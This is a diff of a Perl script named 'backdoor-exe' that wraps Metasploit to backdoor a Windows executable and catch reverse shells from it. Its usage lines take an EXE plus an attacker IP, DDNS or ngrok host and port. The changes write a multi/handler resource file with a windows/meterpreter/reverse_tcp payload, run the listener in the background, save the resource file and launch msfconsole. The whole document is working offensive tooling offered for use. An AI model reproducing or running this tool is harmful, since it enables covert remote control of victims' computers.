@@ -1,5 +1,9 @@
 #!/usr/bin/perl
 #Coded By Zero#
+print("installing Dependencies...\n");
+system("apt install zipalign -y");
+system("clear");
+print("Backdoor-EXE Loading...\n");
 if( $ARGV[0] eq '-h' || $ARGV[0] eq '--help') {
 print "Usage: backdoor-exe -i <exe> <ip/ddns> <port> <out>\n\n";
 print "Usage: backdoor-exe -n <exe> <ngrok_host> <ngrok_port> <fwdport> <out>\n\n";
@@ -20,13 +24,13 @@ system("echo use exploit/multi/handler > /tmp/x");
 system("echo set payload windows/meterpreter/reverse_tcp >> /tmp/x");
 system("echo set lhost $host >> /tmp/x");
 system("echo set lport $port >> /tmp/x");
-system("echo run >> /tmp/x");
+system("echo run -j -z >> /tmp/x");
 system("echo clear >> /tmp/x");
+system("cp /tmp/x ./backdoor-exe.rc");
 print("Opening MSF..\n");
 system("msfconsole -q -r /tmp/x"); }
  
 #Ngrok
-
 if( $ARGV[0] eq '-n' ) {
 $exe=$ARGV[1];
 $host=$ARGV[2];
@@ -41,7 +45,8 @@ system("echo use exploit/multi/handler > /tmp/x");
 system("echo set payload windows/meterpreter/reverse_tcp >> /tmp/x");
 system("echo set lhost 0.0.0.0 >> /tmp/x");
 system("echo set lport $lport >> /tmp/x");
-system("echo run >> /tmp/x");
+system("echo run -j -z >> /tmp/x");
 system("echo clear >> /tmp/x");
+system("cp /tmp/x ./backdoor-exe-ngrok.rc");
 print("Opening MSF..\n");
 system("msfconsole -q -r /tmp/x"); }
